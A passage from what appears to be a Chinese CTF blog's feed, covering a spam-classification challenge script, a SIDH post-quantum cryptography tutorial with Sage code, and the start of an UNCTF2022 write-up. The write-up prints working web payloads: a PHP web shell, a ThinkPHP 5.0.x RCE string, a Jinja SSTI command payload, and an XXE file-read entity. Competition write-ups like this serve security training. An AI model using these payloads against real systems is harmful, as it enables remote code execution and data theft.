class="line">    img.show()</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(raw_input(<span class="string">&#x27;&gt; &#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="垃圾邮件分析"><a href="#垃圾邮件分析" class="headerlink" title="垃圾邮件分析"></a>垃圾邮件分析</h3><p>提供50封邮件内容的正常邮件/垃圾邮件分类，判断10封邮件内容属于哪种分类，全对给flag。</p><p>数量较少，非预期直接按照内容手动判断即可。</p><p>PoW部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;47.97.127.1&quot;</span>,<span class="number">27218</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pow</span>():</span><br><span class="line">    r.recvuntil(<span class="string">&quot;sha256(&quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">28</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;= &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((suffix+x).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;xxxx = &#x27;</span>, proof)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">pow</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">51</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Press ENTER to continue... &#x27;</span>)</span><br><span class="line">    r.sendline()</span><br><span class="line">    </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>按内容手动判断输入H（正常邮件）或S（垃圾邮件），得到结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Good job! Just take it:</span><br><span class="line">flag&#123;da238e5ee5716136c6884c0b4a369093&#125;</span><br></pre></td></tr></table></figure><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;✌️竞赛时间：12月17日 10:00—12月18日 22:00&lt;br&gt;✌️得分规则：比赛采用动态分数制度 ，每道题目的分值将根据解出队伍的数量进行动态记分。&lt;br&gt;✌️题目类型：Web、Pwn、Reverse、Misc、Crypto等&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022赛" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>后量子密码</title>
    <link href="https://lazzzaro.github.io/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/"/>
    <id>https://lazzzaro.github.io/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/</id>
    <published>2022-12-16T14:04:27.000Z</published>
    <updated>2024-03-16T14:24:00.903Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p><strong>后量子密码学</strong>（Post-Quantum Cryptography，PQC），又称<strong>抗量子计算密码学</strong>，是密码学的一个研究领域，专门研究能够抵抗量子计算机的加密算法，特别是公钥加密（非对称加密）算法。不同于量子密码学，后量子密码学使用现有的电子计算机，不依靠量子力学，它依靠的是密码学家认为无法被量子计算机有效解决的计算难题。</p><p>在公钥加密方面，后量子密码学的研究方向包括了格密码学（Lattice-based Cryptography）、容错学习问题（LWE）、多变量密码学（英语：Multivariate Cryptography）、散列密码学（英语：Hash-based Cryptography）、编码密码学（Code-based Cryptography）与超奇异椭圆曲线同源密码学（Supersingular Isogeny Key Exchange）。密码学家认为，基于这些计算难题有望构建出不受量子计算机的威胁的公钥加密系统，替代现有的方案。</p><p>​    </p><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><h4 id="超奇异椭圆曲线"><a href="#超奇异椭圆曲线" class="headerlink" title="超奇异椭圆曲线"></a>超奇异椭圆曲线</h4><p>若曲线 $E$ 定义在有限域 $F_{p^r} (r \in \Z^*)$ 下，若 $E$ 的阶 $\text{order}$ 满足 $\text{order} = 1 \pmod p$，则$E$ 是一条超奇异椭圆曲线 (Supersigular Elliptic Curve)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">2</span>^<span class="number">4</span>*<span class="number">3</span>^<span class="number">3</span>-<span class="number">1</span></span><br><span class="line">F.&lt;i&gt; = GF(p^<span class="number">2</span>, modulus = x^<span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">a = <span class="number">208</span>*i + <span class="number">161</span></span><br><span class="line">Ea = EllipticCurve(F,[<span class="number">0</span>,a,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(Ea.order() % p , Ea.is_supersingular())</span><br></pre></td></tr></table></figure><h4 id="j不变量（j-invariant）"><a href="#j不变量（j-invariant）" class="headerlink" title="j不变量（j-invariant）"></a>j不变量（j-invariant）</h4><p>对于椭圆曲线来说，j不变量可以简单理解为一个判定两条椭圆曲线是否同构的值。也就是说，任何一个曲线都有自己独特的j不变量，而如果两条曲线的j不变量相等，则说明这两条曲线彼此同构。而由于同构的曲线本质上都可以看作同一条曲线，这也就说明，一个j不变量其实在同构意义上其实就唯一对应着一条曲线。</p><p>j不变量相同意味着，可以找到一个同构，将一条曲线映射到另一条曲线上。</p><p>二次扩域 $F_{p^2}$ 下共有 $p^2$ 个j不变量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">2</span>^<span class="number">4</span>*<span class="number">3</span>^<span class="number">3</span>-<span class="number">1</span></span><br><span class="line">F.&lt;i&gt; = GF(p^<span class="number">2</span>, modulus = x^<span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">a = <span class="number">208</span>*i + <span class="number">161</span></span><br><span class="line">Ea = EllipticCurve(F,[<span class="number">0</span>,a,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>])</span><br><span class="line">j = Ea1.j_invariant()</span><br></pre></td></tr></table></figure><h4 id="同源（isogeny）"><a href="#同源（isogeny）" class="headerlink" title="同源（isogeny）"></a>同源（isogeny）</h4><p>一个可分的(separable)同源可以描述为：对于一条曲线 $E$ 以及 $E$ 上一个子群 $G$，都可以构造一个以 $G$ 为核的映射 $\phi: E \rightarrow E’$，这个映射就是同源，映射到的曲线 $E’$​ 就叫做这个同源的陪域(codomain)。</p><p>可以用这个子群 $G$ 和曲线 $E$ 生成一个同源，映射到的曲线 $E’$ 不再是原来的曲线E了，它的j不变量发生了变化。可以用如下方式求出曲线上所有阶为2的点：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">torsion_2_points = E(<span class="number">0</span>).division_points(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(torsion_2_points)</span><br></pre></td></tr></table></figure><h4 id="同源图"><a href="#同源图" class="headerlink" title="同源图"></a>同源图</h4><p>二次扩域 $F_{p^2}$ 下所有超奇异椭圆曲线的j不变量的图，对所有点的 $n$-torsion都画出这些边，就得到了完整的 $n$-isogeny 的同源图，能表示出这个二次扩域中所有度为 $n$​ 的 isogeny 的映射关系。</p><p>之所以边是无向的，就是因为有对偶映射，如果 $E$ 向 $E’$ 有个度为 $n$ 的同源，那么 $E’$ 向 $E$ 也一定有一个度为 $n$​ 的对偶同源。</p><h4 id="模多项式（modular-polynomial）"><a href="#模多项式（modular-polynomial）" class="headerlink" title="模多项式（modular polynomial）"></a>模多项式（modular polynomial）</h4><p>用一个多项式关联了 $d$​​-isogeny 中互为邻居的两个j不变量。如果知道了一个j不变量，那么可以将其代入对应度的modular polynomial去求根，得到的所有根就是所有作为他的邻居的j不变量。</p><p>modular polynomial对应的度较低的多项式形式参考：<a href="https://math.mit.edu/~drew/ClassicalModPolys.html">Modular polynomials (mit.edu)</a></p><p>参考：</p><p><a href="https://tangcuxiaojikuai.xyz/post/e06139e7.html">Isogeny</a></p><p>​    </p><h3 id="超奇异同源密钥交换（SIDH）"><a href="#超奇异同源密钥交换（SIDH）" class="headerlink" title="超奇异同源密钥交换（SIDH）"></a>超奇异同源密钥交换（SIDH）</h3><p>超奇异椭圆曲线同源密码学（Supersingular Elliptic Curve Isogeny Cryptography）是利用超奇异椭圆曲线（Supersingular Elliptic Curves）与超奇异同源图（Supersingular Isogeny Graphs）的数学性质的密码学，可以实现<strong>超奇异同源密钥交换</strong>（Supersingular Isogeny Key Exchange，<strong>SIKE</strong>）（协议为超奇异同源Diffie-Hellman密钥交换协议，<strong>SIDH</strong>），具有前向安全性。其使用方法和现有的Diffie-Hellman密钥交换相似，有望直接替代当前的常规椭圆曲线密钥交换（ECDH）。</p><p>Diffie-Hellman基本协议：</p><p><img src="/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/DH0.jpeg" alt="img"></p><p>抽象Diffie-Hellman：</p><p>Alice的秘密是 $a$，她的计算先做→，得到 $g^a$，再做↓，得到 $g^{ab}$。而Bob的秘密是 $b$，他先做↓，再做→。殊途同归得到 $g^{ab}$。</p><p><img src="/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/DH1.jpeg" alt="img"></p><h4 id="SIDH构造的简化版本"><a href="#SIDH构造的简化版本" class="headerlink" title="SIDH构造的简化版本"></a>SIDH构造的简化版本</h4><p>SIDH的基本代数结构是超奇异椭圆曲线群 $E$ 和超奇异同源（Isogeny）$\phi$。基本思路如下图所示：</p><p><img src="/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/SIDH-2.jpeg" alt="img" style="zoom: 67%;"></p><p>首先，超奇异椭圆曲线群 $E$ 理解为一个群。其次，构造用到的超奇异同源 $\phi : E \mapsto E’$ 是从群 $E$ 到群 $E’$ 的一种群同态。算法类似DH算法分为以下两个步骤：</p><ul><li>首先，Alice选取一个点 $R_A \in E$，$\langle R_A \rangle$ 确定了群 $E$ 的一个子群，然后可以计算得到一个从 $E$ 映射到其子群 $E_A$ 的同源 $\phi_A: E \mapsto E_A$，这是Alice的秘密信息。Alice发送公开信息 $E_A$ 给Bob。</li><li>同样，Bob选择点 $R_B\in E$，然后计算得到 $\phi_B: E \mapsto E_B$，把公开信息 $E_B$ 发送给Alice。</li></ul><p>最终Alice算出 $E/\langle R_B, R_A \rangle$，Bob算出 $E/\langle R_A, R_B \rangle$。上图中的 $E/\langle R_A \rangle$ 和 $E/\langle R_B \rangle$ 分别是 $E_A$ 和 $E_B$，这样表达是为了与之前的表达一致，其实这里并不是做商群，而是表达说 $\phi_A$ 的Kernel是 $\langle R_A \rangle$。目前的科技文献大多使用这种表达。</p><p>上面说到，$E_A$ 是曲线群 $E$ 的子群，它由同源 $\phi_A$ 决定，可理解为群同态 $\phi_A$ 映射到 $E$ 上的像 (Image)形成的子群。同理，$E_{BA}$ 是同源 $\phi_{BA}$ 映射到 $E$ 上的子群，而同源 $\phi_{BA}$ 是由 $\langle R_B, R_A \rangle$ 决定的，即同源 $\phi_{BA}$ 的Kernel是 $\langle R_B, R_A \rangle$。</p><h4 id="SIDH构造的细化版本"><a href="#SIDH构造的细化版本" class="headerlink" title="SIDH构造的细化版本"></a>SIDH构造的细化版本</h4><p><img src="/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/SIDH-3.jpeg" alt="img" style="zoom:67%;"></p><p>为了满足Alice在没有Bob的秘密信息的情况下能计算出 $E_{BA}$ 的要求，SIDH需要使用更多的参数设计和相关计算。算法增加描述如下：</p><h5 id="SIDH参数设计"><a href="#SIDH参数设计" class="headerlink" title="SIDH参数设计"></a>SIDH参数设计</h5><p>首先，选择超奇异椭圆曲线 $E$ 作为公开参数。然后Alice随机选择两个元素 $P_A, Q_A \in E$，并公开作为自己的公共参数。同样，Bob也随机选择两个元素 $P_B, Q_B \in E$ 并公开。</p><h5 id="Alice的操作"><a href="#Alice的操作" class="headerlink" title="Alice的操作"></a>Alice的操作</h5><ul><li>随机选择两个整数 $s_A$ 和 $t_A$ 作为秘密信息，计算 $R_A = s_A P_A + t_A Q_A\in E$，并由 $R_A$ 计算得到一个从 $E$ 映射到其子群 $E_A$ 的同源 $\phi_A: E \mapsto E_A$，这也是Alice的秘密信息；</li><li>获取Bob的公开信息，并计算 $\phi_A(P_B)$ 和 $\phi_A(Q_B)$，这些是公开信息；</li><li>Alice发送公开信息 $E_A$、$\phi_A(P_B)$ 和 $\phi_A(Q_B)$ 给Bob。</li></ul><h5 id="Bob的操作"><a href="#Bob的操作" class="headerlink" title="Bob的操作"></a>Bob的操作</h5><ul><li>随机选择两个整数 $s_B$ 和 $t_B$ 作为秘密信息，计算 $R_B = s_B P_B + t_B Q_B\in E$，并由 $R_B$ 计算得到一个从 $E$ 映射到其子群 $E_B$ 的同源 $\phi_B: E \mapsto E_B$，这也是Bob的秘密信息；</li><li>获取Alice的公开信息，并计算 $\phi_B(P_A)$ 和 $\phi_B(Q_A)$，这些是公开信息；</li><li>Bob发送公开信息 $E_B$、$\phi_B(P_A)$ 和 $\phi_B(Q_A)$ 给Alice。</li></ul><h5 id="秘密值的计算"><a href="#秘密值的计算" class="headerlink" title="秘密值的计算"></a>秘密值的计算</h5><p>Alice计算子群 $E_{BA}$ ，方法如下：</p><ul><li>注意，此时Alice掌握的信息是 $s_A$、$t_A$、$R_A$、$\phi_B(P_A)$ 和 $\phi_B(Q_A)$，她想计算得到 $\phi_B(R_A)$。并且要强调，$\phi_B$ 是一种群同态。</li><li>利用群同态的属性可计算得到：$\phi_B(R_A) = \phi_B(s_A P_A + t_A Q_A) = s_A \phi_B(P_A) + t_A \phi_B(Q_A)$ 。</li><li>根据 $\phi_B(R_A)$ 计算 $E_{BA}$。$E_{BA}$是曲线群 $E$ 的子群，是以 $\phi_B (R_A)$ 为Kernel的群同态映射到 $E$ 上的子群。这个群同态也就是Isogeny，这个Isogeny记为 $\phi_{BA}$ 。</li></ul><p>类似的，Bob可以计算子群 $E_{AB}$：</p><ul><li>$\phi_A(R_B) = s_B \phi_A(P_B) + t_B \phi_A(Q_B)$；</li><li>由此可计算得 $E_{AB}$ ；</li></ul><p>最后冲顶的一步，计算秘密值。首先要明确，很可能 $E_{BA} \ne E_{AB}$，但是，$E_{BA}$ 同构于 $E_{AB}$。利用同构曲线的一个属性：所有同构曲线的J-Invariant值相同。于是Alice和Bob分别计算这两条曲线的J-Invariant值 $J(E_{BA})$ 和 $J(E_{AB})$，这就是他们共同拥有的秘密。J-Invariant的计算定义可在标准教科书中找到，本文把它视为黑盒子使用。</p><h4 id="Sage代码"><a href="#Sage代码" class="headerlink" title="Sage代码"></a>Sage代码</h4><p><strong>参数设置</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#选取一条在素域k上的超奇异椭圆曲线</span></span><br><span class="line">lA, lB = <span class="number">2</span>, <span class="number">3</span></span><br><span class="line">eA, eB = <span class="number">6</span>, <span class="number">7</span></span><br><span class="line">p = lA ^ eA * lB ^ eB - <span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span> p.is_prime()</span><br><span class="line"><span class="keyword">assert</span> p % <span class="number">4</span> == <span class="number">3</span></span><br><span class="line">k = GF(p) <span class="comment"># 注意，这里并不是标准做法，只是因为Sage的局限不得已</span></span><br><span class="line">E = EllipticCurve(k, [<span class="number">1</span>, <span class="number">0</span>]) <span class="comment">#选取曲线</span></span><br><span class="line">E</span><br><span class="line">E.is_supersingular() <span class="comment"># 看看所生成的曲线是否超奇异.</span></span><br><span class="line"><span class="built_in">print</span>(E.j_invariant())</span><br><span class="line"></span><br><span class="line"><span class="comment">#选取四个随机点作为公共参数</span></span><br><span class="line">points = []</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(points) != <span class="number">4</span>:</span><br><span class="line">    p = E.random_point()</span><br><span class="line">    <span class="keyword">if</span> p <span class="keyword">not</span> <span class="keyword">in</span> points:</span><br><span class="line">        points.append(p)</span><br><span class="line">PA, PB, QA, QB = points</span><br><span class="line">PA, PB, QA, QB</span><br></pre></td></tr></table></figure><p><strong>Alice 的操作</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Alice选择两个随机数并计算自己的秘密值RA</span></span><br><span class="line"><span class="comment">#RA定义了phi_A的kernel</span></span><br><span class="line">sA, tA = <span class="number">123</span>, <span class="number">525</span></span><br><span class="line">RA = sA * PA + tA * QA</span><br><span class="line"><span class="built_in">print</span>(RA)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phiA就是同源也是群同态</span></span><br><span class="line">phiA = E.isogeny(RA)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Alice的公共信息EA</span></span><br><span class="line">EA = phiA.codomain()</span><br><span class="line"><span class="built_in">print</span>(E.is_isogenous(EA)) <span class="comment"># 确认EA与E同源</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Alice发送以下信息给Bob</span></span><br><span class="line">EA, phiA_PB, phiA_QB = EA, phiA(PB), phiA(QB)</span><br><span class="line">EA, phiA_PB, phiA_QB</span><br></pre></td></tr></table></figure><p><strong>Bob 的操作</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Bob的工作类似</span></span><br><span class="line">sB, tB = <span class="number">812</span>, <span class="number">580</span></span><br><span class="line">RB = sB * PB + tB * QB</span><br><span class="line"><span class="built_in">print</span>(RB)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phiB就是从E到EB同态映射,Kernel是RB</span></span><br><span class="line">phiB = E.isogeny(RB)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Bob的公共信息EB</span></span><br><span class="line">EB = phiB.codomain()</span><br><span class="line"><span class="built_in">print</span>(E.is_isogenous(EB)) <span class="comment"># 确认EB与E同源</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bob发送以下信息给Alice</span></span><br><span class="line">EB, phiB_PA, phiB_QA = EB, phiB(PA), phiB(QA)</span><br><span class="line">EB, phiB_PA, phiB_QA</span><br></pre></td></tr></table></figure><p><strong>秘密值计算</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Alice计算秘密值</span></span><br><span class="line">R_BA = sA * phiB_PA + tA * phiB_QA</span><br><span class="line"><span class="built_in">print</span>(R_BA)</span><br><span class="line">phiBA = EB.isogeny(R_BA)</span><br><span class="line"><span class="built_in">print</span>(phiBA)</span><br><span class="line">KA = phiBA.codomain().j_invariant()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bob计算秘密值</span></span><br><span class="line">R_AB = sB * phiA_PB + tB * phiA_QB</span><br><span class="line"><span class="built_in">print</span>(R_AB)</span><br><span class="line">phiAB = EA.isogeny(R_AB)</span><br><span class="line"><span class="built_in">print</span>(phiAB)</span><br><span class="line">KB = phiAB.codomain().j_invariant()</span><br><span class="line"></span><br><span class="line"><span class="comment">#测试秘密值是否相等</span></span><br><span class="line"><span class="keyword">if</span> KA == KB:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Success!&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="Castryck-Decru攻击"><a href="#Castryck-Decru攻击" class="headerlink" title="Castryck-Decru攻击"></a>Castryck-Decru攻击</h4><p>（待补充）</p><p>参考：</p><p><a href="https://github.com/GiacomoPope/Castryck-Decru-SageMath">Castryck-Decru-SageMath</a></p><p><a href="https://eprint.iacr.org/2022/975.pdf">An efficient key recovery attack on SIDH</a></p><p><a href="https://github.com/jack4818/Castryck-Decru-SageMath">Castryck-Decru Key Recovery Attack on SIDH</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;后量子密码学&lt;/strong&gt;（Post-Quantum Cryptography，PQC），又称&lt;strong&gt;抗量子计算密码学&lt;/strong&gt;，是密码学的一个研究领域，专门研究能够抵抗量子计算机的加密算法，特别是公钥加密（非对</summary>
      
    
    
    
    <category term="crypto" scheme="https://lazzzaro.github.io/categories/crypto/"/>
    
    
    <category term="后量子密码" scheme="https://lazzzaro.github.io/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>UNCTF2022-公开赛</title>
    <link href="https://lazzzaro.github.io/2022/11/18/match-UNCTF2022-%E5%85%AC%E5%BC%80%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2022/11/18/match-UNCTF2022-%E5%85%AC%E5%BC%80%E8%B5%9B/</id>
    <published>2022-11-18T11:43:08.000Z</published>
    <updated>2022-11-20T17:32:45.560Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>为深入贯彻习近平总书记关于二十大提出的网络强国的重要思想，围绕建设网络强国的战略部署，建设网络强国的战略部署要与“两个一百年”奋斗目标同步推进，由御之安承办UNCTF2022网络安全大赛（以下简称“大赛”）将于今年11月份召开，以赛事为契机，提升网络安全保障能力，汇聚高端网络安全人才，共筑网络安全防线，为中国网络安全事业发展提供智力支撑和保障。</p><p>线上报名：2022年10月24日10:00-11月11日10:00，比赛时间：2022年11月12日12:00-11月18日12:00</p><p><strong>Rank: 1</strong></p><hr><h2 id="Web"><a href="#Web" class="headerlink" title="# Web"></a># Web</h2><h3 id="我太喜欢bilibili大学啦"><a href="#我太喜欢bilibili大学啦" class="headerlink" title="我太喜欢bilibili大学啦"></a>我太喜欢bilibili大学啦</h3><p>phpinfo页面环境变量中直接泄露flag。</p><p>​    </p><h3 id="ezgame"><a href="#ezgame" class="headerlink" title="ezgame"></a>ezgame</h3><blockquote><p>简单的游戏~ 打过boss就能获得flag</p></blockquote><p>F12查看js，在main.js里搜索 <code>unctf</code>，在混淆js代码中找到flag片段，连接起来得：<code>unctf&#123;c5f9a27d-6f88-49fb-a510-fe7b163f8dd3&#125;</code>。</p><p>​    </p><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><blockquote><p>又是一道简单的签到</p></blockquote><p>F12发现注释有学号 <code>20200101</code> 为账号密码，尝试 <code>20200102/20200103/20200104/20200105</code> 分别回显 <code>f/l/a/g</code>，脚本遍历提取：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://365172a3-2701-4e1a-8f59-a548f14e7027.node.yuzhian.com.cn/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20200102</span>,<span class="number">20200102</span>+<span class="number">40</span>):</span><br><span class="line">    data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    r = requests.post(url,data=data)</span><br><span class="line">    flag += r.text[-<span class="number">5</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p>弱类型比较。第一层，16进制0x绕过；第二层，数组绕过；第三层，用其他命令和通配符绕过RCE。</p><p>Payload：</p><p><code>/index.php?code=print_r(exec(&quot;uniq%09/fl*&quot;));</code>，POST：<code>a=0x&amp;key1[]=a&amp;key2[]=b</code></p><p>​    </p><h3 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h3><blockquote><p>简简单单的文件上传</p></blockquote><p>无过滤的文件上传。上传一个 <code>1.php</code>，内含 <code>&lt;?php system($_GET[x]);</code>，再访问传入命令RCE。</p><p>Payload：<code>/uplO4d/1.php?x=cat%20/home/ctf/flag</code></p><p>​    </p><h3 id="给你一刀"><a href="#给你一刀" class="headerlink" title="给你一刀"></a>给你一刀</h3><p>ThinkPHP 5.0.x未开启强制路由RCE漏洞。</p><p>Payload: <code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=env</code></p><p>flag: <code>UNCTF&#123;Y0u_A3r_so_G9eaD_hacker&#125;</code></p><p>​    </p><h3 id="302与深大"><a href="#302与深大" class="headerlink" title="302与深大"></a>302与深大</h3><blockquote><p>thai想让你知道szu的战队……吗，醒醒，这个页面不是主页！</p></blockquote><p>Request头的考察。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?miku=puppy</span><br><span class="line">POST: micgo=ikun</span><br><span class="line">Cookie: admin=true</span><br></pre></td></tr></table></figure><p>flag: <code>UNCTF&#123;thai_miku_micgo_qka_WEB_GOD&#125;</code></p><p>​    </p><h3 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy ssti"></a>easy ssti</h3><blockquote><p>php看腻了，来点python吧</p></blockquote><p>基本无过滤的SSTI。</p><p>Payload：</p><p><code>/register</code>，POST：<code>user=&#123;&#123;cycler.__init__.__globals__.os.popen('env').read()&#125;&#125;&amp;pwd=</code></p><p>​    </p><h3 id="听说php有一个xxe"><a href="#听说php有一个xxe" class="headerlink" title="听说php有一个xxe"></a>听说php有一个xxe</h3><p>XXE。先访问 <code>/hint</code>，再访问 <code>/dom.php</code>，根据 <code>DOMDocument::loadXML()</code>信息，POST一个XML数据读flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///flag&quot;&gt; ]&gt; </span><br><span 